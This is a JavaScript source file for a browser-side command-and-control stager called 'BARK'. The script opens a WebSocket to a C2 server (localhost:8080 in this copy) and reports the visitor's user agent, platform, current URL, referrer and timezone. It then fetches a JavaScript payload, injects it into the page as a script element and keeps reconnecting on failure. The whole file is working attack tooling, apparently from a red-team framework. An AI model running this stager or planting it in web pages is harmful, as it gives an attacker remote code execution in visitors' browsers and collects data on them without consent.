/**
 * BARK C2 Agent Stager
 * 
 * This script creates a WebSocket connection to the C2 server,
 * identifies itself as an agent stager, and receives a JavaScript payload
 * which is then injected into the current DOM.
 */
(function() {
    // Create unique agent ID based on timestamp and random string
    const generateAgentId = () => {
        const timestamp = Date.now().toString(36);
        const randomStr = Math.random().toString(36).substring(2, 10);
        return `agent_${timestamp}_${randomStr}`;
    };

    // Get browser and system information
    const getSystemInfo = () => {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer,
            currentUrl: window.location.href,
            hostname: window.location.hostname
        };
    };

    // Create and manage WebSocket connection
    const connectToC2 = () => {
        console.log("[BARK Stager] Initializing...");
        
        try {
            // Use WebSocket protocol matching the page's protocol (ws or wss)
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//localhost:8080/ws`;
            
            // Create WebSocket connection
            const socket = new WebSocket(wsUrl);
            
            // Connection opened
            socket.addEventListener('open', (event) => {
                console.log("[BARK Stager] Connection established with C2 server");
                
                // Prepare initial registration message
                const registrationMsg = {
                    type: "stager_registration",
                    agentId: generateAgentId(),
                    timestamp: new Date().toISOString(),
                    systemInfo: getSystemInfo()
                };
                
                // Send registration message
                socket.send(JSON.stringify(registrationMsg));
                console.log("[BARK Stager] Registration sent to C2 server");
            });
            
            // Listen for messages from server
            socket.addEventListener('message', (event) => {
                console.log("[BARK Stager] Received payload from C2 server");
                try {
                    // Parse the response
                    const response = JSON.parse(event.data);
                    
                    // Check if it's a payload delivery message
                    if (response.type === "agent_payload") {
                        // Get the JavaScript payload
                        const payload = response.payload;
                        
                        // Inject the payload into the DOM
                        injectPayload(payload);
                        
                        // Acknowledge receipt
                        socket.send(JSON.stringify({
                            type: "payload_received",
                            status: "success",
                            timestamp: new Date().toISOString()
                        }));
                        
                        // Close the stager connection as its job is done
                        setTimeout(() => {
                            socket.close();
                            console.log("[BARK Stager] Stager completed, connection closed");
                        }, 1000);
                    }
                } catch (error) {
                    console.error("[BARK Stager] Error processing server message:", error);
                    
                    // Try to use the data directly if parsing failed
                    if (typeof event.data === 'string') {
                        injectPayload(event.data);
                    }
                }
            });
            
            // Handle errors
            socket.addEventListener('error', (event) => {
                console.error("[BARK Stager] WebSocket error:", event);
            });
            
            // Handle connection close
            socket.addEventListener('close', (event) => {
                console.log("[BARK Stager] Connection closed:", event.code, event.reason);
                
                // Attempt to reconnect after delay if this wasn't a normal closure
                if (event.code !== 1000) {
                    console.log("[BARK Stager] Attempting to reconnect in 30 seconds...");
                    setTimeout(connectToC2, 30000);
                }
            });
            
            return socket;
        } catch (error) {
            console.error("[BARK Stager] Failed to connect to C2 server:", error);
            return null;
        }
    };
    
    // Function to inject payload into DOM
    const injectPayload = (payload) => {
        try {
            console.log("[BARK Stager] Injecting payload into DOM");
            
            // Create script element
            const scriptElement = document.createElement('script');
            scriptElement.type = 'text/javascript';
            scriptElement.textContent = payload;
            
            // Add a comment to mark this as a BARK agent script (optional)
            scriptElement.textContent = `/* BARK Agent Payload */\n${payload}`;
            
            // Add to DOM - preferably at the end of body for maximum compatibility
            if (document.body) {
                document.body.appendChild(scriptElement);
            } else {
                // Fallback to head if body is not available
                document.head.appendChild(scriptElement);
            }
            
            console.log("[BARK Stager] Payload successfully injected");
        } catch (error) {
            console.error("[BARK Stager] Failed to inject payload:", error);
        }
    };
    
    // Start the stager
    connectToC2();
})();